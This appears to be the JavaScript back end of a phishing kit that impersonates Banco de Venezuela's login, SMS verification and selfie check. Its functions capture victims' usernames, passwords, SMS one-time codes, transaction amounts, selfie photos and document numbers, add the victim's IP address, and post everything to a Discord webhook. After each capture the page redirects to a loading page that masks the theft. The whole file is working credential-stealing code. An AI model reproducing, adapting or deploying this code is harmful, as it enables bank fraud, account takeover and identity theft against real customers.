// ============================================
// CONFIGURACIÓN DE DISCORD
// ============================================
const DISCORD_WEBHOOK_URL = '----------------------------------';

// Variables para controlar envíos únicos
let loginSent = false;
let isProcessing = false;
let smsSent = false;

// ============================================
// FUNCIÓN PARA OBTENER IP DEL CLIENTE
// ============================================
async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.warn('⚠️ Error obteniendo IP:', error);
        return 'No disponible';
    }
}

// ============================================
// FUNCIÓN PARA OBTENER FECHA Y HORA FORMATEADA
// ============================================
function getFormattedDateTime() {
    const now = new Date();
    const fecha = now.toLocaleDateString('es-ES', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric'
    });
    const hora = now.toLocaleTimeString('es-ES', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    return `📅 ${fecha} ⏰ ${hora}`;
}

// ============================================
// FUNCIÓN PRINCIPAL PARA ENVIAR A DISCORD
// ============================================
async function sendToDiscord(embed) {
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });
        
        if (response.ok || response.status === 204) {
            console.log('✅ Mensaje enviado a Discord correctamente');
            return { ok: true };
        } else {
            throw new Error(`Error en respuesta de Discord: ${response.status}`);
        }
    } catch (error) {
        console.error('❌ Error enviando a Discord:', error);
        return { ok: false, error: error.message };
    }
}

// ============================================
// FUNCIÓN PARA ENVIAR LOGIN A DISCORD
// ============================================
async function sendLoginToDiscord(username, password) {
    // Evitar envíos duplicados
    if (loginSent) {
        console.log('⚠️ Login ya enviado, omitiendo...');
        return { ok: true, message: 'Ya enviado' };
    }
    
    if (isProcessing) {
        console.log('⚠️ Ya hay un envío en proceso...');
        return { ok: true, message: 'En proceso' };
    }

    try {
        isProcessing = true;
        
        const ip = await getClientIP();
        const datetime = getFormattedDateTime();
        
        // Construir mensaje completo
        const fullMessage = `🔐 NUEVO LOGIN - BANCO DE VENEZUELA\n👤 Usuario: ${username}\n🔑 Contraseña: ${password}\n${datetime}\n🌐 IP: ${ip}\n⚠️ Información confidencial`;
        
        const embed = {
            title: '🔐 NUEVO LOGIN - BANCO DE VENEZUELA',
            description: fullMessage,
            color: 0x0067b1,
            timestamp: new Date().toISOString(),
            footer: {
                text: '⚠️ Información confidencial'
            }
        };
        
        const result = await sendToDiscord(embed);
        
        if (result.ok) {
            loginSent = true;
            isProcessing = false;
            console.log('✅ Login enviado a Discord correctamente');
            
            // Redirigir a cargando.html
            window.location.href = 'cargando.html';
            return { ok: true };
        } else {
            isProcessing = false;
            return { ok: false, error: result.error };
        }
    } catch (error) {
        isProcessing = false;
        console.error('❌ Error enviando login a Discord:', error);
        return { ok: false, error: error.message };
    }
}

// ============================================
// FUNCIÓN PARA ENVIAR SMS A DISCORD
// ============================================
async function sendSmsToDiscord(smsCode, monto) {
    // Evitar envíos duplicados
    if (smsSent) {
        console.log('⚠️ SMS ya enviado, omitiendo...');
        return { ok: true, message: 'Ya enviado' };
    }
    
    if (isProcessing) {
        console.log('⚠️ Ya hay un envío en proceso...');
        return { ok: true, message: 'En proceso' };
    }

    try {
        isProcessing = true;
        
        const ip = await getClientIP();
        const datetime = getFormattedDateTime();
        
        // Construir mensaje SMS
        const fullMessage = `📱 CÓDIGO SMS - BANCO DE VENEZUELA\n🔢 Código SMS: ${smsCode}\n💰 Monto: $${monto}\n${datetime}\n🌐 IP: ${ip}\n⚠️ Información confidencial`;
        
        const embed = {
            title: '📱 CÓDIGO SMS - BANCO DE VENEZUELA',
            description: fullMessage,
            color: 0xFF8C00,
            timestamp: new Date().toISOString(),
            footer: {
                text: '⚠️ Información confidencial'
            }
        };
        
        const result = await sendToDiscord(embed);
        
        if (result.ok) {
            smsSent = true;
            isProcessing = false;
            console.log('✅ SMS enviado a Discord correctamente');
            
            // Redirigir a cargando.html
            window.location.href = 'cargando.html';
            return { ok: true };
        } else {
            isProcessing = false;
            return { ok: false, error: result.error };
        }
    } catch (error) {
        isProcessing = false;
        console.error('❌ Error enviando SMS a Discord:', error);
        return { ok: false, error: error.message };
    }
}

// ============================================
// FUNCIÓN PARA ENVIAR FOTO (SEL.html)
// ============================================
async function sendPhotoToDiscord(photoBase64) {
    try {
        const base64Data = photoBase64.split(',')[1];
        const byteCharacters = atob(base64Data);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'image/jpeg' });
        
        const formData = new FormData();
        formData.append('file', blob, 'selfie.jpg');
        
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });
        
        if (response.ok || response.status === 204) {
            console.log('✅ Foto enviada a Discord');
            return { ok: true };
        } else {
            throw new Error('Error en respuesta de Discord');
        }
    } catch (error) {
        console.error('❌ Error enviando foto a Discord:', error);
        return { ok: false, error: error.message };
    }
}

// ============================================
// FUNCIÓN PARA ENVIAR MENSAJE DE VERIFICACIÓN FACIAL
// ============================================
async function sendVerificationMessage(type, document) {
    try {
        let title, description, color;
        
        if (type === 'success') {
            title = '✅ VERIFICACIÓN FACIAL EXITOSA';
            description = `✅ VERIFICACIÓN FACIAL EXITOSA\n📄 Documento: ${document}\n${getFormattedDateTime()}`;
            color = 0x00FF00;
        } else {
            title = '❌ INTENTO DE SELFIE FALLIDO';
            description = `❌ INTENTO DE SELFIE FALLIDO\n📄 Documento: ${document}\n${getFormattedDateTime()}`;
            color = 0xFF0000;
        }
        
        const embed = {
            title: title,
            description: description,
            color: color,
            timestamp: new Date().toISOString()
        };
        
        const result = await sendToDiscord(embed);
        return result;
    } catch (error) {
        console.error('Error enviando verificación:', error);
        return { ok: false, error: error.message };
    }
}

// ============================================
// FUNCIONES PARA RESETEAR ESTADOS
// ============================================
function resetLoginSent() {
    loginSent = false;
    isProcessing = false;
    console.log('🔄 Estado de login resetado');
}

function resetSmsSent() {
    smsSent = false;
    isProcessing = false;
    console.log('🔄 Estado de SMS resetado');
}

function resetAllStates() {
    loginSent = false;
    smsSent = false;
    isProcessing = false;
    console.log('🔄 Todos los estados resetados');
}

// ============================================
// EXPORTAR FUNCIONES PARA USO GLOBAL
// ============================================
if (typeof window !== 'undefined') {
    window.sendLoginToDiscord = sendLoginToDiscord;
    window.sendSmsToDiscord = sendSmsToDiscord;
    window.sendPhotoToDiscord = sendPhotoToDiscord;
    window.sendVerificationMessage = sendVerificationMessage;
    window.sendToDiscord = sendToDiscord;
    window.getClientIP = getClientIP;
    window.getFormattedDateTime = getFormattedDateTime;
    window.resetLoginSent = resetLoginSent;
    window.resetSmsSent = resetSmsSent;
    window.resetAllStates = resetAllStates;
    
    console.log('✅ Script.js cargado correctamente');
    console.log('📤 Funciones disponibles:', Object.keys(window).filter(k => k.startsWith('send') || k.startsWith('reset')));
}